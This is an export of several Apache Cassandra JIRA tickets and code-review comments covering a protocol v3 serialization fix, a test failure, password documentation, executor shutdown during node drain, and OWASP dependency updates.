|[trunk|https://github.com/apache/cassandra/pull/2084]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2542/workflows/16be8e22-b8d1-440f-93bd-a599b56e3093]|

I think that CI will fail for the new tests on the [4.0, 4.1] -> [4.1, trunk] upgrade paths. That's because our CI script [generates the dtest artifacts from the main repo|https://github.com/apache/cassandra/blob/trunk/.circleci/config-2_1.yml#L2684-L2693], and the branches there don't contain the serialization fix that we are proposing here.

Reviewers can test it locally by generating the dtests artifacts of each patched branch with {{{}ant dtest-jar{}}}, and copying all the generated {{dtest-*.jar}} files into the {{build}} directory of the tested branch.;;;","19/Jan/23 08:58;bereng;Code lgtm. But why not change that url in the final circle config file just this one time and get a green run? Do iiuc correctly assuming changing that 1 loc in the yaml should render a green CI and we'd tested in the official CI instead of the reviewer's box i.e.? Double checking I am not missing anything...;;;","19/Jan/23 11:38;adelapena;Agree, we can manually change a couple of things on the CircleCI yaml to point to the proper repo and branches:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/2082]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2558/workflows/6ae34afc-fdac-40dc-89bd-002e54df4431]|
|[4.1|https://github.com/apache/cassandra/pull/2083]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2559/workflows/aa602a9a-ca69-4ea8-aa80-49faab4f990e]|
|[trunk|https://github.com/apache/cassandra/pull/2084]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2557/workflows/4f6dfcab-6ce9-4b50-ab5e-af22d53f1e23]|

We should probably make the repo and branches env vars, so we can do this with {{generate.sh}} and without manually editing the yaml. I'll create a ticket for that.;;;","19/Jan/23 13:21;bereng;Ah good I see that's rendered green :-)

+1;;;","20/Jan/23 11:59;adelapena;Note that the mistake in the serialisation of protocol v3 that was introduced with 4.0.0 has effectively meant that we have two versions of protocol v3: the one used by 3.0/3.x, and the one used by 4.0/4.1/4.x.

The proposed fix will make all new 4.0/4.1 minors use the same version of protocol v3 that 3.0/3.x have always used.

However, we will hit the same problem in a cluster with a node using an unpatched 4.0/4.1/4.x node and a patched 4.0/4.1/4.x node. In other words, we are trading upgrade issues on 3.0.x -> 4.0.7 by upgrade issues on 4.0.8 -> 4.0.9, etc.

I'm not sure how we could know which version of v3 (broken or unbroken) we should use, if we can.

That said, the problem occurs only when using v3, and I'd say that the old v3 protocol is much more likely to be used on a major 3.0/3.x- > 4.0/4.1 upgrade than in a 4.0/4.1 - > 4.0/4.1 upgrade. If that assumption is true, we are improving things with this fix, and stopping the spread of the broken version of the v3 protocol.

What do you think? [~brandon.williams] any thoughts on this?;;;","20/Jan/23 12:14;brandon.williams;bq. That said, the problem occurs only when using v3, and I'd say that the old v3 protocol is much more likely to be used on a major 3.0/3.x- > 4.0/4.1 upgrade than in a 4.0/4.1 - > 4.0/4.1 upgrade

I agree with you on this.  I think we should add a NEWS entry to this effect and go ahead and commit this.  Most likely users will neither read the news entry nor ever hit the issue this way, and this ticket is evidence that it will be encountered on upgrade if left in the current state, so I think this is easily a net positive.;;;","20/Jan/23 12:49;adelapena;Makes sense, thanks for the feedback. I have added that entry on {{{}NEWS.txt{}}}, it says:
{quote}All previous versions of 4.x contained a mistake on the implementation of the old CQL native protocol v3. That mistake produced issues when paging over tables with compact storage and a single clustering column during rolling upgrades involving 3.x and 4.x nodes. The fix for that issue makes that it can now appear during rolling upgrades from 4.1.0 or 4.0.0-4.0.3. If that your case, please use protocol v4 or higher in your driver. See CASSANDRA-17507 for further details.
{quote};;;","20/Jan/23 12:53;brandon.williams;bq. or 4.0.0-4.0.3

Is 4.0.3 correct?  I don't understand the significance if we are putting the fix in 4.0.8.;;;","20/Jan/23 13:06;adelapena;Oh, right, it's a typo, the last 4.0 affected version is 4.0.7. Just fixed it, thanks!;;;","23/Jan/23 05:40;bereng;Dropped a couple nits. Feel free to ignore an commit at your discretion;;;","23/Jan/23 11:50;adelapena;Thanks, addressed those on commit.

Committed to 4.0 as [9a0af4112e87f5b97056aa39e63c5ab461b60237|https://github.com/apache/cassandra/commit/9a0af4112e87f5b97056aa39e63c5ab461b60237] and merged to [4.1|https://github.com/apache/cassandra/commit/6c96e2fd41368323844a080d806cbbb7b7fc9790] and [trunk|https://github.com/apache/cassandra/commit/cab864a6316d4091185559c7b21a8073bfcf42b2].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: AlterTest.testCreateAlterNetworkTopologyWithDefaults,CASSANDRA-17496,13436476,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jmckenzie,jmckenzie,jmckenzie,29/Mar/22 16:29,27/May/22 19:25,13/Jul/23 08:40,30/Mar/22 18:42,4.1,4.1-alpha1,,,,,Test/unit,,,,0,,Caused by CASSANDRA-17478,,jmckenzie,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17478,,,,,,,,,,,,,,,,0.0,jmckenzie,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 30 14:32:13 UTC 2022,,,,,,,All,,,,"0|z10xuo:",9223372036854775807,,,,brandon.williams,,,,Low,,4.1,,"https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=1a4dccd3b9f9bfefbccbbe383982306d3aeea1d1",,,,,,,,,Fix unit test,,,,,"29/Mar/22 16:33;jmckenzie;Perfect example from CASSANDRA-17478 on why you shouldn't change things during commit. :)

[branch|https://github.com/apache/cassandra/compare/trunk...josh-mckenzie:cassandra-17496?expand=1]
[JDK 8 CI|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/194/workflows/b620b52e-1cba-420e-b6ea-d250def4aa27]
[JDK 11 CI|https://app.circleci.com/pipelines/github/josh-mckenzie/cassandra/194/workflows/b13d1728-4ee1-4a5f-8fd7-484a14fb1af9];;;","30/Mar/22 14:32;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Pre hashed passwords in CQL docs,CASSANDRA-17494,13436308,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,29/Mar/22 05:20,27/May/22 19:25,13/Jul/23 08:40,04/Apr/22 05:20,4.1,4.1-alpha1,,,,,Documentation,,,,0,,CASSANDRA-17334 needs some docs,,adelapena,bereng,jeromatron,,,,,,,,,,,,"bereng closed pull request #1531: CASSANDRA-17494 Adding docs for pre hashed passwords
URL: https://github.com/apache/cassandra/pull/1531


;04/Apr/22 05:21;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,CASSANDRA-17334,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Documentation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Apr 01 08:57:35 UTC 2022,,,,,,,All,,,,"0|z10wtk:",9223372036854775807,,,,adelapena,,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/bdde665032679bd197566cfeea34b52538da4f1a,,,,,,,,,See PR,,,,,"30/Mar/22 06:28;bereng;[~adelapena] this shold be a quick one to review for you as you already reviewed the parent issue :-);;;","30/Mar/22 11:29;adelapena;Sure, I'll take a look.;;;","31/Mar/22 05:11;bereng;Thx [~adelapena]!;;;","01/Apr/22 08:45;adelapena;Looks good to me, +1;;;","01/Apr/22 08:57;bereng;Squashed and fired a [jenkins|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1552/] run which might seem like an overkill but better safe than sorry.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Shutdown all ScheduledExecutors as part of node drainage,CASSANDRA-17493,13436242,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,smiklosovic,smiklosovic,28/Mar/22 19:43,27/May/22 19:25,13/Jul/23 08:40,14/Apr/22 07:52,4.1,4.1-alpha1,,,,,Legacy/Core,,,,0,,"We are currently shutting down only non-periodic executors in StorageService#drain. We should shut down all of them. As of now, there does not seem to be any reason why these executors should be active.",,jonmeredith,paulo,sathyakplm,smiklosovic,,,,,,,,,,,"smiklosovic commented on code in PR #1529:
URL: https://github.com/apache/cassandra/pull/1529#discussion_r846675796


##########
src/java/org/apache/cassandra/hints/HintsService.java:
##########
@@ -268,7 +268,10 @@ public long getTotalHintsSize(UUID hostId)
     public synchronized void shutdownBlocking() throws ExecutionException, InterruptedException
     {
         if (isShutDown)
-            throw new IllegalStateException(""HintsService has already been shut down"");

Review Comment:
   This is here for accommodating the test. 



;09/Apr/22 20:06;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849237370


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");

Review Comment:
   Yes. With one caveat and that is that instead of waiting 1 minute _for each executor_ (here we had just one), we are waiting 1 minute _for all of them_ to be shutdown / terminated. I consider this to be the flaw of the previous solution. They were not covering all other executors and I think that if whoever did that was taking other executors into account, he would end up with same solution.



;13/Apr/22 08:47;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849240415


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();
-            setMode(Mode.DRAINED, !isFinalShutdown);
+
+            try
+            {
+                ScheduledExecutors.shutdownNowAndWait(1, MINUTES);

Review Comment:
   I am sorry I am not getting your first paragraph at all. What approxTime? The second paragraph builds on top of me not understanding the first.



;13/Apr/22 08:50;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends. The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:02;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends.
   
   Any subsystem should keed track of own tasks it submitted into these executors and they should be stopped internally first. By this solution, we are making it better to shut it all down. It may happen that if the subsystem is not shutting its own tasks down on drain that subsystem would ""leak"" unstopped tasks.
   
   The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:06;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else (even the task that subsystem forgot to shut down itself) rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends.
   
   Any subsystem should keed track of own tasks it submitted into these executors and they should be stopped internally first. By this solution, we are making it better to shut it all down. It may happen that if the subsystem is not shutting its own tasks down on drain that subsystem would ""leak"" unstopped tasks.
   
   The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:10;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else (even a task that subsystem forgot to shut down itself) rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends.
   
   Any subsystem should keed track of own tasks it submitted into these executors and they should be stopped internally first. By this solution, we are making it better to shut it all down. It may happen that if the subsystem is not shutting its own tasks down on drain that subsystem would ""leak"" unstopped tasks.
   
   The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:10;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else (even a task that subsystem forgot to shut down itself) rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends. Also, if we shut down first and the shut down a subsystem, is not it the case that we might shut down something prematurely?
   
   Any subsystem should keed track of own tasks it submitted into these executors and they should be stopped internally first. By this solution, we are making it better to shut it all down. It may happen that if the subsystem is not shutting its own tasks down on drain that subsystem would ""leak"" unstopped tasks.
   
   The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:12;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849251387


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();

Review Comment:
   Well, the movement was done purely by looking at it - I similarly think nothing is scheduling on that executor. There is stuff related to flushing commit logs etc. There seems to be nothing which would schedule stuff for ColumnFamilyStore to these executors.
   
   This is again something I consider to be the flaw of the previous solution. I think that all logic should be ""stopped"" first before shutting down all executors. I would say that the subsystem should clean up after itself first and then we are safer to shut down everything else (even a task that subsystem forgot to shut down itself) rather than thinking that we submitted a task to these executors on which ColumnFamilyStore depends. Also, if we shut down executors first and then we shut down a subsystem, is not it the case that we might shut down something prematurely?
   
   Any subsystem should keed track of own tasks it submitted into these executors and they should be stopped internally first. By this solution, we are making it better to shut it all down. It may happen that if the subsystem is not shutting its own tasks down on drain that subsystem would ""leak"" unstopped tasks.
   
   The tests / pipeline proves me right that, I do not see any regression.



;13/Apr/22 09:13;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849265499


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();
-            setMode(Mode.DRAINED, !isFinalShutdown);
+
+            try
+            {
+                ScheduledExecutors.shutdownNowAndWait(1, MINUTES);
+            }
+            finally
+            {
+                setMode(Mode.DRAINED, !isFinalShutdown);

Review Comment:
   Exactly my reasoning behind that. We do not have idempotent drain right now. This is quite sad to be honest. We can not ""re-drain"". So this is our only chance to be drained even it throws.



;13/Apr/22 09:17;githubbot;600","smiklosovic commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r849311408


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");
-
             ColumnFamilyStore.shutdownPostFlushExecutor();
-            setMode(Mode.DRAINED, !isFinalShutdown);
+
+            try
+            {
+                ScheduledExecutors.shutdownNowAndWait(1, MINUTES);

Review Comment:
   @jonmeredith  I think I got it, I rewrote it a little bit. You will see it in the next commit. I think, to be super safe, it is better if we move the shutdown of that very specific fast tasks executor to Runtime's shutdown hooks so we shut down as the very last thing so we still progress time at least while c* is between drain and the actual shut down area.



;13/Apr/22 10:06;githubbot;600","smiklosovic closed pull request #1529: CASSANDRA-17493 Shutdown all ScheduledExecutors as part of node drainage
URL: https://github.com/apache/cassandra/pull/1529


;13/Apr/22 20:08;githubbot;600","smiklosovic closed pull request #1563: CASSANDRA-17493 the second take
URL: https://github.com/apache/cassandra/pull/1563


;14/Apr/22 07:50;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7800,,,0,7800,,,,CASSANDRA-17180,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Code -> Bug - Unclear Impact,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Apr 14 07:46:34 UTC 2022,,,,,,,All,,,,"0|z10wfs:",9223372036854775807,,,,jonmeredith,smiklosovic,,,Normal,,NA,,https://github.com/apache/cassandra/commit/74bb6d8496d5a2a5b89a843ba764fe37b65ee331,,,,,,,,,CI build,,,,,"28/Mar/22 19:50;smiklosovic;https://github.com/apache/cassandra/pull/1529;;;","29/Mar/22 13:21;sathyakplm;Hi [~smiklosovic], why is this a bug? What benefits do the changes in the PR bring in?;;;","29/Mar/22 14:05;smiklosovic;[~sathyakplm] We are implementing CASSANDRA-17180 where we want to start a periodic task and we want to be sure that such task will not be executed on drain and we do not want to hold any Future reference to it or anything like that. So we are relying on the fact that periodic task executors are stopped as part of the drain which is not happening now.;;;","30/Mar/22 14:33;smiklosovic;https://github.com/apache/cassandra/pull/1529
https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1590/;;;","11/Apr/22 08:50;smiklosovic;[~brandon.williams] would you take a look at this one please? This is basically a blocker for 17180. I desperately want to see all this stuff in 4.1.;;;","11/Apr/22 12:13;paulo;Looks good to me - can you just clarify why this was changed?
{code:java}
        if (isShutDown)
-            throw new IllegalStateException(""HintsService has already been shut down"");
+        {
+            logger.warn(""HintsService has already been shut down"");
+            return;
+        }
{code};;;","11/Apr/22 12:45;paulo;Is this error [found here|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1590/testReport/org.apache.cassandra.distributed.test/CasCriticalSectionTest/criticalSectionTest/] related to this change? I don't think so but just checking.

{code:none}
ERROR 22:18:29 Exception in thread Thread[MutationStage-1,5,SharedPool]
java.lang.RuntimeException: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
	at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2577)
	at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
	at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
	at org.apache.cassandra.hints.HintsService.write(HintsService.java:165)
	at org.apache.cassandra.service.StorageProxy$7.runMayThrow(StorageProxy.java:2656)
	at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2573)
	... 6 common frames omitted
ERROR [MutationStage-1] node1 2022-04-09 22:18:29,622 JVMStabilityInspector.java:68 - Exception in thread Thread[MutationStage-1,5,SharedPool]
java.lang.RuntimeException: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
	at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2577)
	at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
	at org.apache.cassandra.concurrent.SEPWorker.run(SEPWorker.java:120)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
	at org.apache.cassandra.hints.HintsService.write(HintsService.java:165)
	at org.apache.cassandra.service.StorageProxy$7.runMayThrow(StorageProxy.java:2656)
	at org.apache.cassandra.service.StorageProxy$HintRunnable.run(StorageProxy.java:2573)
	... 6 common frames omitted
{code};;;","11/Apr/22 13:13;smiklosovic;[~paulo]  it is because the test is in fact draining twice - the first time I drain in the test itself - programmatically. The second time the draining process is executed when Cassandra node itself is going down as part of closing the cluster. It will fail - it will throw - that it was already shut down - and it was - but by myself as part of testing it.;;;","11/Apr/22 13:24;smiklosovic;[~paulo] here https://github.com/apache/cassandra/blob/trunk/test/distributed/org/apache/cassandra/distributed/impl/Instance.java#L756;;;","11/Apr/22 13:50;jonmeredith;[~smiklosovic] I can take a look at this today as well if you'd like extra eyes on it.;;;","11/Apr/22 14:27;smiklosovic;solution with rewriting jvm dtest to plain unit test here (1), build here (2)

(1) [https://github.com/apache/cassandra/pull/1563]

(2) [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1594/];;;","11/Apr/22 14:29;smiklosovic;[~jonmeredith] sure, dont rush it though, in the meanwhile I hope [~paulo]  takes the second look too. I ll wait till ... Wednesday morning UTC+2.;;;","12/Apr/22 13:30;smiklosovic;[https://app.circleci.com/pipelines/github/instaclustr/cassandra/915/workflows/ac6f220f-a346-4728-8bcd-6ccc711f6951]

https://github.com/apache/cassandra/pull/1563;;;","13/Apr/22 16:20;jonmeredith;Thanks for responding to feedback. +1 on the most recent version provided you get an explainably clean test run.;;;","14/Apr/22 07:46;smiklosovic;https://app.circleci.com/pipelines/github/instaclustr/cassandra/919/workflows/090bb620-b9a8-40f4-a83c-b5d7cfd8e5c4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
OWASP failures on lower branches 3/2022,CASSANDRA-17492,13436137,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,28/Mar/22 11:20,13/Apr/22 08:36,13/Jul/23 08:40,29/Mar/22 12:18,3.0.27,3.11.13,,,,,Build,,,,0,,In CASSANDRA-17459 we fixed some security problems that we missed for 3.0 and 3.11: CASSANDRA-17460 for jackson and the driver suppression.,,bereng,,,,,,,,,,,,,,"jonmeredith commented on code in PR #1563:
URL: https://github.com/apache/cassandra/pull/1563#discussion_r848950472


##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
-            ScheduledExecutors.nonPeriodicTasks.shutdown();
-            if (!ScheduledExecutors.nonPeriodicTasks.awaitTermination(1, MINUTES))
-                logger.warn(""Unable to terminate non-periodic tasks within 1 minute."");

Review Comment:
   So this log message would now appear as a TimeoutException in the main catch block on L5301?



##########
src/java/org/apache/cassandra/service/StorageService.java:
##########
@@ -5287,12 +5287,16 @@ protected synchronized void drain(boolean isFinalShutdown) throws IOException, I
             CommitLog.instance.shutdownBlocking();
 
             // wait for miscellaneous tasks like sstable and commitlog segment deletion
